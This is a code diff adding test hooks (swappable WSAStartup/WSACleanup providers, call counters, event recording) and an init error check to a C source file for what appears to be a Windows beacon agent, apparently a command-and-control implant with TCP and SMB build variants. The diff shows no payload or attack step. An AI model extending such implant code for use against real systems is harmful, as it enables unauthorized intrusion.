@@ -1,6 +1,41 @@
 #include "beacon_agent_internal.h"
 
+#ifdef BEACON_TEST
+#include "beacon_test_hooks.h"
+#endif
+
 #pragma comment(lib, "ws2_32.lib")
+
+#ifdef BEACON_TEST
+static INT (WINAPI *g_agent_wsa_startup_provider)(WORD, LPWSADATA) = WSAStartup;
+static INT (WINAPI *g_agent_wsa_cleanup_provider)(VOID) = WSACleanup;
+static volatile LONG g_agent_wsa_startup_calls;
+static volatile LONG g_agent_wsa_cleanup_calls;
+
+VOID AgentTestSetWinsockProviders(INT (WINAPI *startup)(WORD, LPWSADATA), INT (WINAPI *cleanup)(VOID))
+{
+    g_agent_wsa_startup_provider = startup ? startup : WSAStartup;
+    g_agent_wsa_cleanup_provider = cleanup ? cleanup : WSACleanup;
+}
+
+VOID AgentTestResetWinsockProviders(VOID)
+{
+    g_agent_wsa_startup_provider = WSAStartup;
+    g_agent_wsa_cleanup_provider = WSACleanup;
+    InterlockedExchange(&g_agent_wsa_startup_calls, 0);
+    InterlockedExchange(&g_agent_wsa_cleanup_calls, 0);
+}
+
+LONG AgentTestGetWinsockStartupCalls(VOID)
+{
+    return InterlockedCompareExchange(&g_agent_wsa_startup_calls, 0, 0);
+}
+
+LONG AgentTestGetWinsockCleanupCalls(VOID)
+{
+    return InterlockedCompareExchange(&g_agent_wsa_cleanup_calls, 0, 0);
+}
+#endif
 
 #if defined(BEACON_EXTERNAL_TCP_BUILD) && \
     (defined(BEACON_INTERNAL_TCP_BUILD) || defined(BEACON_INTERNAL_SMB_BUILD))
@@ -21,7 +56,9 @@ INT AgentInit(Agent* agent)
 
     SecureZeroMemory(agent, sizeof(*agent));
 
-    ContextInit(&agent->ctx);
+    if (!ContextInit(&agent->ctx)) {
+        return 0;
+    }
 
     /* ContextInit 会清零 BeaconContext，API 解析必须在它之后执行。 */
     if (!Win32ApiInit(&agent->ctx.api)) {
@@ -29,7 +66,13 @@ INT AgentInit(Agent* agent)
         return 0;
     }
 
+#ifdef BEACON_TEST
+    InterlockedIncrement(&g_agent_wsa_startup_calls);
+    BeaconTestRecord(BEACON_TEST_EVENT_WSA_STARTUP, 0, 0);
+    if (g_agent_wsa_startup_provider(MAKEWORD(2, 2), &agent->wsa) != 0) {
+#else
     if (WSAStartup(MAKEWORD(2, 2), &agent->wsa) != 0) {
+#endif
         ContextFree(&agent->ctx);
         return 0;
     }
@@ -53,7 +96,12 @@ VOID AgentFree(Agent* agent)
     }
 
     if (agent->wsa_started) {
+#ifdef BEACON_TEST
+        InterlockedIncrement(&g_agent_wsa_cleanup_calls);
+        g_agent_wsa_cleanup_provider();
+#else
         WSACleanup();
+#endif
         agent->wsa_started = 0;
     }
 }
@@ -66,6 +114,10 @@ INT AgentRun(Agent* agent)
     if (!agent || !agent->initialized) {
         return -1;
     }
+
+#ifdef BEACON_TEST
+    BeaconTestRecord(BEACON_TEST_EVENT_AGENT_RUN_BEGIN, 0, 0);
+#endif
 
     ctx = &agent->ctx;
 
